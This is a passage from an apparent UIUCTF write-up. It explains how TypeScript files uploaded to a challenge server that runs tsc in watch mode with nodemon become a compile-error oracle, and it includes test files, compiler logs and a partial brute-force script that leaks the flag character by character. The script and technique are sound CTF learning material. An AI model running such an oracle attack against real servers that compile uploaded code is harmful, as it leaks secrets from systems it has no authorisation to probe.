</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">13</span><span class="">  </span><span class="token property">&quot;devDependencies&quot;</span><span class="token operator">:</span><span class=""> </span><span class="token punctuation">{</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">14</span><span class="">    </span><span class="token property">&quot;@types/express&quot;</span><span class="token operator">:</span><span class=""> </span><span class="token string">&quot;^5.0.3&quot;</span><span class="token punctuation">,</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">15</span><span class="">    </span><span class="token property">&quot;@types/multer&quot;</span><span class="token operator">:</span><span class=""> </span><span class="token string">&quot;^2.0.0&quot;</span><span class="token punctuation">,</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">16</span><span class="">    </span><span class="token property">&quot;concurrently&quot;</span><span class="token operator">:</span><span class=""> </span><span class="token string">&quot;^9.2.0&quot;</span><span class="token punctuation">,</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">17</span><span class="">    </span><span class="token property">&quot;nodemon&quot;</span><span class="token operator">:</span><span class=""> </span><span class="token string">&quot;^3.1.10&quot;</span><span class="token punctuation">,</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">18</span><span class="">    </span><span class="token property">&quot;typescript&quot;</span><span class="token operator">:</span><span class=""> </span><span class="token string">&quot;^5.8.3&quot;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">19</span><span class="">  </span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">20</span><span class="">  </span><span class="token property">&quot;dependencies&quot;</span><span class="token operator">:</span><span class=""> </span><span class="token punctuation">{</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">21</span><span class="">    </span><span class="token property">&quot;express&quot;</span><span class="token operator">:</span><span class=""> </span><span class="token string">&quot;^5.1.0&quot;</span><span class="token punctuation">,</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">22</span><span class="">    </span><span class="token property">&quot;multer&quot;</span><span class="token operator">:</span><span class=""> </span><span class="token string">&quot;^2.0.2&quot;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">23</span><span class="">  </span><span class="token punctuation">}</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">24</span><span class=""></span><span class="token punctuation">}</span></code></pre></div></div>
<p>the server uses <a href="https://www.npmjs.com/package/concurrently"><code class="opacity-75 bg-black/30 rounded px-1.5 py-1 text-[0.9em]">concurrently</code></a> to run <code class="opacity-75 bg-black/30 rounded px-1.5 py-1 text-[0.9em]">tsc -w</code> and <code class="opacity-75 bg-black/30 rounded px-1.5 py-1 text-[0.9em]">nodemon dist/index.js</code> simultaneously. The key observation is this:</p>
<ul>
<li><code class="opacity-75 bg-black/30 rounded px-1.5 py-1 text-[0.9em]">tsc -w</code> runs the TypeScript compiler in <a href="https://www.typescriptlang.org/docs/handbook/compiler-options.html">watch mode</a>, telling it to automatically recompile the project when source files have changed.</li>
<li><code class="opacity-75 bg-black/30 rounded px-1.5 py-1 text-[0.9em]">nodemon</code> will <a href="https://www.npmjs.com/package/nodemon">restart the server</a> when a <code class="opacity-75 bg-black/30 rounded px-1.5 py-1 text-[0.9em]">.js</code> file has changed.</li>
<li>Since the file count is just a local variable, when the server restarts it will be reset to 0.</li>
</ul>
<p>The above combine to give us a TypeScript error oracle: uploading TypeScript files to the server will trigger <code class="opacity-75 bg-black/30 rounded px-1.5 py-1 text-[0.9em]">tsc</code> to recompile the project. If the compilation succeeds, new <code class="opacity-75 bg-black/30 rounded px-1.5 py-1 text-[0.9em]">.js</code> files will be generated that will trigger <code class="opacity-75 bg-black/30 rounded px-1.5 py-1 text-[0.9em]">nodemon</code> to restart the server and reset the file count; otherwise, the file count will be incremented as normal. Querying the file count, therefore, lets us check whether arbitrary TypeScript code compiles on the server.</p>
<p>Indeed, we can test with simple TS files that both fails to and succeed in compiling. Uploading a TypeScript file that fails to compile, we get</p>
<div class="border border-white/10 rounded-lg my-2"><p class="text-xs rounded-t-lg px-4 py-0.5 text-secondary">Code<!-- --> (ts)<!-- -->:<!-- --> <button class="hover:underline">(copy)</button></p><div class="rounded-b-lg overflow-hidden text-xs"><pre class="prismjs"><code style="white-space:pre"><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">1</span><span class="token keyword module">import</span><span class=""> </span><span class="token imports punctuation">{</span><span class="token imports"> flag </span><span class="token imports punctuation">}</span><span class="">  </span><span class="token keyword module">from</span><span class=""> </span><span class="token string">&#x27;../index&#x27;</span><span class="token punctuation">;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">2</span>
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">3</span><span class=""></span><span class="token keyword module">export</span><span class=""> </span><span class="token keyword">const</span><span class=""> x</span><span class="token operator">:</span><span class=""> </span><span class="token builtin">number</span><span class=""> </span><span class="token operator">=</span><span class=""> flag</span><span class="token punctuation">;</span></code></pre></div></div>
<div class="border border-white/10 rounded-lg my-2"><p class="text-xs rounded-t-lg px-4 py-0.5 text-secondary">Code<!-- --> (bash)<!-- -->:<!-- --> <button class="hover:underline">(copy)</button></p><div class="rounded-b-lg overflow-hidden text-xs"><pre class="prismjs"><code style="white-space:pre"><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">1</span><span class="token number">5</span><span class="">:47:53 PM - File change detected. Starting incremental compilation</span><span class="token punctuation">..</span><span class="">.
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">2</span><span class=""></span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">3</span><span class=""></span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class=""> images/test.ts</span><span class="token punctuation">(</span><span class="token number">3,14</span><span class="token punctuation">)</span><span class="">: error TS2322: Type </span><span class="token string">&#x27;string&#x27;</span><span class=""> is not assignable to </span><span class="token builtin class-name">type</span><span class=""> </span><span class="token string">&#x27;number&#x27;</span><span class="token builtin class-name">.</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">4</span><span class=""></span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">5</span><span class=""></span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class=""> </span><span class="token number">5</span><span class="">:47:53 PM - Found </span><span class="token number">1</span><span class=""> error. Watching </span><span class="token keyword">for</span><span class=""> </span><span class="token function">file</span><span class=""> changes.</span></code></pre></div></div>
<p>but using a file that successfully compiles, we instead get</p>
<div class="border border-white/10 rounded-lg my-2"><p class="text-xs rounded-t-lg px-4 py-0.5 text-secondary">Code<!-- --> (ts)<!-- -->:<!-- --> <button class="hover:underline">(copy)</button></p><div class="rounded-b-lg overflow-hidden text-xs"><pre class="prismjs"><code style="white-space:pre"><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">1</span><span class="token keyword module">import</span><span class=""> </span><span class="token imports punctuation">{</span><span class="token imports"> flag </span><span class="token imports punctuation">}</span><span class="">  </span><span class="token keyword module">from</span><span class=""> </span><span class="token string">&#x27;../index&#x27;</span><span class="token punctuation">;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">2</span>
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">3</span><span class=""></span><span class="token keyword module">export</span><span class=""> </span><span class="token keyword">const</span><span class=""> x</span><span class="token operator">:</span><span class=""> </span><span class="token builtin">string</span><span class=""> </span><span class="token operator">=</span><span class=""> flag</span><span class="token punctuation">;</span></code></pre></div></div>
<div class="border border-white/10 rounded-lg my-2"><p class="text-xs rounded-t-lg px-4 py-0.5 text-secondary">Code<!-- --> (bash)<!-- -->:<!-- --> <button class="hover:underline">(copy)</button></p><div class="rounded-b-lg overflow-hidden text-xs"><pre class="prismjs"><code style="white-space:pre"><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">1</span><span class="token number">5</span><span class="">:44:58 PM - File change detected. Starting incremental compilation</span><span class="token punctuation">..</span><span class="">.
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">2</span><span class=""></span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">3</span><span class=""></span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">4</span><span class=""></span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class=""> </span><span class="token number">5</span><span class="">:44:59 PM - Found </span><span class="token number">0</span><span class=""> errors. Watching </span><span class="token keyword">for</span><span class=""> </span><span class="token function">file</span><span class=""> changes.
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">5</span><span class=""></span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class=""> </span><span class="token punctuation">[</span><span class="">nodemon</span><span class="token punctuation">]</span><span class=""> restarting due to changes</span><span class="token punctuation">..</span><span class="">.
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">6</span><span class=""></span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class=""> </span><span class="token punctuation">[</span><span class="">nodemon</span><span class="token punctuation">]</span><span class=""> starting </span><span class="token variable">`</span><span class="token variable function">node</span><span class="token variable"> dist/index.js</span><span class="token variable">`</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">7</span><span class=""></span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class=""> Express is listening at http://localhost:3000</span></code></pre></div></div>
<p>and our file count is reset to 0.</p>
<p>We can use this error oracle to leak the flag with a technique reminiscent of <a href="https://kevin.fish/writeups/a851fdabc90d887a61af81c071f6f0ce">BuckeyeCTF 2023</a>: since the flag is exported from <code class="opacity-75 bg-black/30 rounded px-1.5 py-1 text-[0.9em]">index.ts</code> as a <code class="opacity-75 bg-black/30 rounded px-1.5 py-1 text-[0.9em]">const</code> variable, we can use <a href="https://www.typescriptlang.org/docs/handbook/2/template-literal-types.html">template literal types</a> to assert against substrings of the flag.</p>
<p>Concretely, for those not familiar with this technique, if the flag exported by <code class="opacity-75 bg-black/30 rounded px-1.5 py-1 text-[0.9em]">index.ts</code> was</p>
<div class="border border-white/10 rounded-lg my-2"><p class="text-xs rounded-t-lg px-4 py-0.5 text-secondary">Code<!-- --> (ts)<!-- -->:<!-- --> <button class="hover:underline">(copy)</button></p><div class="rounded-b-lg overflow-hidden text-xs"><pre class="prismjs"><code style="white-space:pre"><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">1</span><span class="token keyword module">export</span><span class=""> </span><span class="token keyword">const</span><span class=""> flag </span><span class="token operator">=</span><span class=""> </span><span class="token string">&#x27;uiuctf{test_flag}&#x27;</span><span class="">  </span><span class="token comment">// flag: &quot;uiuctf{test_flag}&quot;</span></code></pre></div></div>
<p>then the first assignment would successfully type check, while the second fails (since the first character of the <code class="opacity-75 bg-black/30 rounded px-1.5 py-1 text-[0.9em]">flag</code> string is not <code class="opacity-75 bg-black/30 rounded px-1.5 py-1 text-[0.9em]">a</code>):</p>
<div class="border border-white/10 rounded-lg my-2"><p class="text-xs rounded-t-lg px-4 py-0.5 text-secondary">Code<!-- --> (ts)<!-- -->:<!-- --> <button class="hover:underline">(copy)</button></p><div class="rounded-b-lg overflow-hidden text-xs"><pre class="prismjs"><code style="white-space:pre"><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">1</span><span class="token keyword">const</span><span class=""> foo</span><span class="token operator">:</span><span class=""> </span><span class="token template-string template-punctuation string">`</span><span class="token template-string string">u</span><span class="token template-string interpolation interpolation-punctuation punctuation">${</span><span class="token template-string interpolation builtin">string</span><span class="token template-string interpolation interpolation-punctuation punctuation">}</span><span class="token template-string template-punctuation string">`</span><span class=""> </span><span class="token operator">=</span><span class=""> flag</span><span class="token punctuation">;</span></code></pre></div></div>
<div class="border border-white/10 rounded-lg my-2"><p class="text-xs rounded-t-lg px-4 py-0.5 text-secondary">Code<!-- --> (ts)<!-- -->:<!-- --> <button class="hover:underline">(copy)</button></p><div class="rounded-b-lg overflow-hidden text-xs"><pre class="prismjs"><code style="white-space:pre"><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">1</span><span class="token keyword">const</span><span class=""> foo</span><span class="token operator">:</span><span class=""> </span><span class="token template-string template-punctuation string">`</span><span class="token template-string string">a</span><span class="token template-string interpolation interpolation-punctuation punctuation">${</span><span class="token template-string interpolation builtin">string</span><span class="token template-string interpolation interpolation-punctuation punctuation">}</span><span class="token template-string template-punctuation string">`</span><span class=""> </span><span class="token operator">=</span><span class=""> flag</span><span class="token punctuation">;</span><span class="">  </span><span class="token comment">// Type &#x27;&quot;uiuctf{test_flag}&quot;&#x27; is not assignable to type &#x27;`a${string}`&#x27;.</span></code></pre></div></div>
<p>Thus, we just need to use template literals to brute force the flag character by character, checking the file count each time to determine if the character was correct. Here&#x27;s a simple script that does just that:</p>
<div class="border border-white/10 rounded-lg my-2"><p class="text-xs rounded-t-lg px-4 py-0.5 text-secondary">Code<!-- --> (js)<!-- -->:<!-- --> <button class="hover:underline">(copy)</button></p><div class="rounded-b-lg overflow-hidden text-xs"><pre class="prismjs"><code style="white-space:pre"><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">1</span><span class="token keyword">const</span><span class=""> </span><span class="token constant">BASE_URL</span><span class=""> </span><span class="token operator">=</span><span class=""> </span><span class="token string">&#x27;https://inst-ff5e88fd8f55fd4e-upload-upload-and-away.chal.uiuc.tf/&#x27;</span><span class="token punctuation">;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">2</span>
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">3</span><span class=""></span><span class="token keyword">function</span><span class=""> </span><span class="token function">sleep</span><span class="token punctuation">(</span><span class="token parameter">ms</span><span class="token punctuation">)</span><span class=""> </span><span class="token punctuation">{</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">4</span><span class="">    </span><span class="token keyword control-flow">return</span><span class=""> </span><span class="token keyword">new</span><span class=""> </span><span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">resolve</span><span class="token punctuation">)</span><span class=""> </span><span class="token arrow operator">=&gt;</span><span class=""> </span><span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="">resolve</span><span class="token punctuation">,</span><span class=""> ms</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">5</span><span class=""></span><span class="token punctuation">}</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">6</span>
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">7</span><span class=""></span><span class="token keyword">async</span><span class=""> </span><span class="token keyword">function</span><span class=""> </span><span class="token function">getFileCount</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class=""> </span><span class="token punctuation">{</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">8</span><span class="">    </span><span class="token keyword">const</span><span class=""> </span><span class="token punctuation">{</span><span class=""> file_count </span><span class="token punctuation">}</span><span class=""> </span><span class="token operator">=</span><span class=""> </span><span class="token keyword control-flow">await</span><span class=""> </span><span class="token punctuation">(</span><span class="token keyword control-flow">await</span><span class=""> </span><span class="token function">fetch</span><span class="token punctuation">(</span><span class="token template-string template-punctuation string">`</span><span class="token template-string interpolation interpolation-punctuation punctuation">${</span><span class="token template-string interpolation constant">BASE_URL</span><span class="token template-string interpolation interpolation-punctuation punctuation">}</span><span class="token template-string string">/filecount</span><span class="token template-string template-punctuation string">`</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token method function property-access">json</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">9</span><span class="">    </span><span class="token keyword control-flow">return</span><span class=""> file_count</span><span class="token punctuation">;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">10</span><span class=""></span><span class="token punctuation">}</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">11</span>
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">12</span><span class=""></span><span class="token keyword">async</span><span class=""> </span><span class="token keyword">function</span><span class=""> </span><span class="token function">deleteImages</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class=""> </span><span class="token punctuation">{</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">13</span><span class="">    </span><span class="token keyword control-flow">await</span><span class=""> </span><span class="token function">fetch</span><span class="token punctuation">(</span><span class="token template-string template-punctuation string">`</span><span class="token template-string interpolation interpolation-punctuation punctuation">${</span><span class="token template-string interpolation constant">BASE_URL</span><span class="token template-string interpolation interpolation-punctuation punctuation">}</span><span class="token template-string string">/images</span><span class="token template-string template-punctuation string">`</span><span class="token punctuation">,</span><span class=""> </span><span class="token punctuation">{</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">14</span><span class="">        </span><span class="token literal-property property">method</span><span class="token operator">:</span><span class=""> </span><span class="token string">&#x27;DELETE&#x27;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">15</span><span class="">    </span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">16</span><span class=""></span><span class="token punctuation">}</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">17</span>
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">18</span><span class=""></span><span class="token keyword">async</span><span class=""> </span><span class="token keyword">function</span><span class=""> </span><span class="token function">uploadCode</span><span class="token punctuation">(</span><span class="token parameter">code</span><span class="token punctuation">)</span><span class=""> </span><span class="token punctuation">{</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">19</span><span class="">    </span><span class="token keyword">const</span><span class=""> data </span><span class="token operator">=</span><span class=""> </span><span class="token keyword">new</span><span class=""> </span><span class="token class-name">FormData</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">20</span><span class="">    data</span><span class="token punctuation">.</span><span class="token method function property-access">append</span><span class="token punctuation">(</span><span class="token string">&#x27;file&#x27;</span><span class="token punctuation">,</span><span class=""> </span><span class="token keyword">new</span><span class=""> </span><span class="token class-name">Blob</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="">code</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class=""> </span><span class="token punctuation">{</span><span class=""> </span><span class="token literal-property property">type</span><span class="token operator">:</span><span class=""> </span><span class="token string">&#x27;text/plain&#x27;</span><span class=""> </span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class=""> </span><span class="token string">&#x27;test.ts&#x27;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">21</span>
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">22</span><span class="">    </span><span class="token keyword">const</span><span class=""> res </span><span class="token operator">=</span><span class=""> </span><span class="token keyword control-flow">await</span><span class=""> </span><span class="token punctuation">(</span><span class="token keyword control-flow">await</span><span class=""> </span><span class="token function">fetch</span><span class="token punctuation">(</span><span class="token template-string template-punctuation string">`</span><span class="token template-string interpolation interpolation-punctuation punctuation">${</span><span class="token template-string interpolation constant">BASE_URL</span><span class="token template-string interpolation interpolation-punctuation punctuation">}</span><span class="token template-string string">/upload</span><span class="token template-string template-punctuation string">`</span><span class="token punctuation">,</span><span class=""> </span><span class="token punctuation">{</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">23</span><span class="">        </span><span class="token literal-property property">method</span><span class="token operator">:</span><span class=""> </span><span class="token string">&#x27;POST&#x27;</span><span class="token punctuation">,</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">24</span><span class="">        </span><span class="token literal-property property">body</span><span class="token operator">:</span><span class=""> data
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">25</span><span class="">    </span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token method function property-access">text</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">26</span>
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">27</span><span class="">    </span><span class="token comment">// console.log(res);</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">28</span><span class=""></span><span class="token punctuation">}</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">29</span>
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">30</span><span class=""></span><span class="token keyword">const</span><span class=""> charset </span><span class="token operator">=</span><span class=""> </span><span class="token string">&#x27;abcdefghijklmnopqrstuvwxyz_}&#x27;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">31</span><span class=""></span><span class="token keyword">let</span><span class=""> flag </span><span class="token operator">=</span><span class=""> </span><span class="token string">&#x27;uiuctf{&#x27;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">32</span>
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">33</span><span class=""></span><span class="token keyword">async</span><span class=""> </span><span class="token keyword">function</span><span class=""> </span><span class="token function">bruteOnce</span><span class="token punctuation">(</span><span class="token parameter">char</span><span class="token punctuation">)</span><span class=""> </span><span class="token punctuation">{</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">34</span><span class="">    </span><span class="token keyword control-flow">await</span><span class=""> </span><span class="token function">deleteImages</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">35</span><span class="">    </span><span class="token keyword control-flow">await</span><span class=""> </span><span class="token function">uploadCode</span><span class="token punctuation">(</span><span class="token template-string template-punctuation string">`</span><span class="token template-string string">import { flag } from &#x27;../index&#x27;; export const x: \`</span><span class="token template-string interpolation interpolation-punctuation punctuation">${</span><span class="token template-string interpolation">flag</span><span class="token template-string interpolation interpolation-punctuation punctuation">}</span><span class="token template-string interpolation interpolation-punctuation punctuation">${</span><span class="token template-string interpolation">char</span><span class="token template-string interpolation interpolation-punctuation punctuation">}</span><span class="token template-string string">\$\{string\}\` = flag;</span><span class="token template-string template-punctuation string">`</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">36</span>
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">37</span><span class="">    </span><span class="token comment">// Sleep so that the server has time to restart if the type check passes</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">38</span><span class="">    </span><span class="token keyword control-flow">await</span><span class=""> </span><span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">1500</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">39</span><span class="">    </span><span class="token keyword">const</span><span class=""> count </span><span class="token operator">=</span><span class=""> </span><span class="token keyword control-flow">await</span><span class=""> </span><span class="token function">getFileCount</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">40</span>
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">41</span><span class="">    </span><span class="token keyword control-flow">return</span><span class=""> count </span><span class="token operator">===</span><span class=""> </span><span class="token number">0</span><span class="token punctuation">;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">42</span><span class=""></span><span class="token punctuation">}</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">43</span>
